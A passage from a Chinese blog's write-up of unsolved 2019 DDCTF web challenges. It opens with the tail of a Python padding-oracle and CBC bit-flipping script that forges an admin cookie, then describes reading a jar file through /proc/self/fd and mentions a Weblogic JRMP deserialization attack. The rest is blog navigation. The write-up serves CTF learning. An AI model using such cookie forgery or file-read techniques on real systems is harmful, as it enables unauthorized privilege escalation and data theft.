class="keyword">True</span>,allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">return</span>(rsp.content)  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_byte_flipping</span><span class="params">(strings)</span>:</span></span><br><span class="line">    token_padding=padding(strings)</span><br><span class="line">    c2=<span class="string">'b8d85a91bdeae799086cc723e7bf1685'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">    c2_m=<span class="string">'a7d3878a0466c70b59264b5ed33f5013'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">    c1=xor(c2_m,token_padding[<span class="number">16</span>:])</span><br><span class="line">    c1_m=padding_oracle(c1.encode(<span class="string">'hex'</span>), <span class="number">16</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    iv=xor(c1_m,token_padding[<span class="number">0</span>:<span class="number">16</span>]) <span class="comment">#iv</span></span><br><span class="line">    <span class="keyword">return</span>((iv+c1+c2).encode(<span class="string">'base64'</span>)[:<span class="number">-1</span>])</span><br><span class="line">print(cbc_byte_flipping(<span class="string">'&#123;"id":1,"roleAdmin":true&#125;'</span>))</span><br></pre></td></tr></table></figure>
+<img src="/2019/04/29/2019ddctf-unsolved-writeup/12.png">
+<p>这里借用chamd5的wp脚本，利用伪造的cookie我们提权成为admin，能下载到一个txt。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Try to hack~ </span><br><span class="line">Hint:</span><br><span class="line">1. Env: Springboot + JDK8(openjdk version &quot;1.8.0_181&quot;) + Docker~ </span><br><span class="line">2. You can not exec commands~</span><br></pre></td></tr></table></figure>
+<p>后面利用这个文件下载的api可以读取文件，在<code>/proc/self/fd/15</code>可以读到jar包，之后就是java的部分了，GG。官方的提示是<code>jrmp</code>，最后看wp是用的Weblogic JRMP反序列化漏洞打出来的。</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a></p>
+<p><a href="https://www.zhaoj.in/read-5269.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5269.html</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485734&amp;idx=1&amp;sn=4d5c92902ece0db4eb29c0addecdb679&amp;chksm=e89e21fedfe9a8e89b42bf1df92ab8907c866df112c4c86bce8a38eafb3d90de9109e6c03516&amp;xtrack=1&amp;scene=0&amp;subscene=131&amp;clicktime=1556023454&amp;ascene=7&amp;devicetype=android-28&amp;version=2700033c&amp;nettype=cmnet&amp;abtest_cookie=BAABAAoACwASABMABQAjlx4AX5keAM2ZHgDamR4A3JkeAAAA&amp;lang=zh_CN&amp;pass_ticket=YMjuQzyV9NBheOwb57Q7IzReaZd3gLT38Yu%252B%252FFcSC8KUJPp78f35Uw%252BPwVZ25nDA&amp;wx_header=1" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485734&amp;idx=1&amp;sn=4d5c92902ece0db4eb29c0addecdb679&amp;chksm=e89e21fedfe9a8e89b42bf1df92ab8907c866df112c4c86bce8a38eafb3d90de9109e6c03516&amp;xtrack=1&amp;scene=0&amp;subscene=131&amp;clicktime=1556023454&amp;ascene=7&amp;devicetype=android-28&amp;version=2700033c&amp;nettype=cmnet&amp;abtest_cookie=BAABAAoACwASABMABQAjlx4AX5keAM2ZHgDamR4A3JkeAAAA&amp;lang=zh_CN&amp;pass_ticket=YMjuQzyV9NBheOwb57Q7IzReaZd3gLT38Yu%252B%252FFcSC8KUJPp78f35Uw%252BPwVZ25nDA&amp;wx_header=1</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://hurricane618.me">hurricane618</a>
+            </p><p>原文链接：<a href="https://hurricane618.me/2019/04/29/2019ddctf-unsolved-writeup/">https://hurricane618.me/2019/04/29/2019ddctf-unsolved-writeup/</a>
+            </p><p>发表日期：<a href="https://hurricane618.me/2019/04/29/2019ddctf-unsolved-writeup/">April 29th 2019, 2:52:54 pm</a>
+            </p><p>更新日期：<a href="https://hurricane618.me/2019/04/29/2019ddctf-unsolved-writeup/">April 29th 2019, 2:57:07 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/04/19/2019ddctf-my-solutions-writeup/" title="2019DDCTF 部分我解决的题目writeup">
+                    <div class="prevTitle">2019DDCTF 部分我解决的题目writeup</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    <div id="disqus_thread"></div>
+    <script>
+        /**
+    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+        
+        var disqus_config = function () {
+        this.page.url = "https://hurricane618.me/2019/04/29/2019ddctf-unsolved-writeup/";  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = "2019DDCTF 未解决的web题 writeup"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        
+        (function () { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://hurricane618.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:hurricane618@hotmail.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/hurricane618" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//twitter.com/hurricane_618" class="iconfont-archer twitter" target="_blank" title="twitter"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+    
+    <span id="busuanzi_container_site_uv">已经有 <span id="busuanzi_value_site_uv"></span> 个不明生物光临此地</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#homebrew-event-loop"><span class="toc-number">1.</span> <span class="toc-text">homebrew event loop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql弱口令"><span class="toc-number">2.</span> <span class="toc-text">mysql弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#再来一杯Java"><span class="toc-number">3.</span> <span class="toc-text">再来一杯Java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 16
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href="/2019/04/29/2019ddctf-unsolved-writeup/">2019DDCTF 未解决的web题 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/2019ddctf-my-solutions-writeup/">2019DDCTF 部分我解决的题目writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span><a class="archive-post-title" href="/2019/03/31/2019TCTF-web-writeup/">2019TCTF web writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2019/03/02/serial-ports-translation-cn/">快速寻找串行接口</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/18</span><a class="archive-post-title" href="/2019/02/18/yingshi-camera-firmware-extract/">萤石某摄像头的安全分析--固件提取</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/03</span><a class="archive-post-title" href="/2019/02/03/thinkphp-5-0-23-rce/">thinkphp 5.0.23 rce分析和复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href="/2019/01/27/haozi-xss-challenges/">haozi xss 挑战赛 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span><a class="archive-post-title" href="/2019/01/24/code-breaking-lumenserial/">code-breaking lumenserial 复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href="/2019/01/10/code-breaking-esay-wp/">code-breaking easy部分题目writeup</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href="/2018/08/15/google-ctf-beginner-part2/">Google CTF Beginner Part2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href="/2018/08/01/dianfengjikeCTF-web/">巅峰极客CTF 部分Web复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/2018/07/18/google-ctf-beginner-part1/">Google CTF Beginner Part1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/08</span><a class="archive-post-title" href="/2018/07/08/google-ctf-beginner-js-safe-1/">Google CTF Beginner JS Safe 1 复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/01</span><a class="archive-post-title" href="/2018/07/01/phpmyadmin4-8-1-background-LFI/">phpmyadmin4.8.1 后台LFI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/2018/06/30/csp-bypass-summary/">CSP绕过总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/2018/06/26/new-start/">新的开始</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="JAVA"><span class="iconfont-archer">&#xe606;</span>JAVA</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="闲聊"><span class="iconfont-archer">&#xe606;</span>闲聊</span>
+    
+        <span class="sidebar-tag-name" data-tags="IOT"><span class="iconfont-archer">&#xe606;</span>IOT</span>
+    
+        <span class="sidebar-tag-name" data-tags="CSP"><span class="iconfont-archer">&#xe606;</span>CSP</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="翻译"><span class="iconfont-archer">&#xe606;</span>翻译</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="技术"><span class="iconfont-archer">&#xe60a;</span>技术</span>
+    
+        <span class="sidebar-category-name" data-categories="杂谈"><span class="iconfont-archer">&#xe60a;</span>杂谈</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "hurricane618"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
